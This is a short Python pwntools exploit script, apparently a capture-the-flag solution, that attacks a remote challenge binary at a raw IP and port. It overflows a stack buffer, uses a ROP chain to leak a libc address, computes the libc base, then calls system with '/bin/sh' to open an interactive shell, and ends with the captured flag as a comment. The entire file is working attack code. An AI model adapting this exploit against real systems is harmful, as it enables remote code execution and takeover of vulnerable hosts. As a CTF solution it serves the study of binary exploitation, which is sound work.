#!/usr/bin/python3

from pwn import *

filename = "./chall"

#io = process(filename)
io = remote("138.68.177.159", 30537)
elf = ELF(filename)

context.clear(arch="amd64")


offset = 40
buffer = 0x601048
syscall = 0x40053b


def main():
	rop = ROP(elf)
	rop.call(elf.sym.read, [0x0, buffer])
	rop.call(syscall, [0x1, elf.got.__libc_start_main])
	rop.main()


	payload  = b"A"*40 + rop.chain()
	io.sendline(payload)
	
	payload = b""
	io.sendline(payload)
	
	leaked_address = u64(io.recv(6).decode("latin-1").ljust(8,"\x00"))
	log.info("Leaked address: %s " % hex(leaked_address))
	
	base_address = leaked_address - 0x21b10
	
	log.info("Base address: %s " % hex(base_address))	
	system = base_address + 0x4f550
	binsh = base_address + 0x1b3e1a
	
	rop = ROP(elf)
	rop.call(system, [binsh])
	io.sendline(b"A"*offset + rop.chain())
	io.interactive()


if __name__ == "__main__":
	main()

# CHTB{n0_0utput_n0_pr0bl3m_w1th_sr0p}
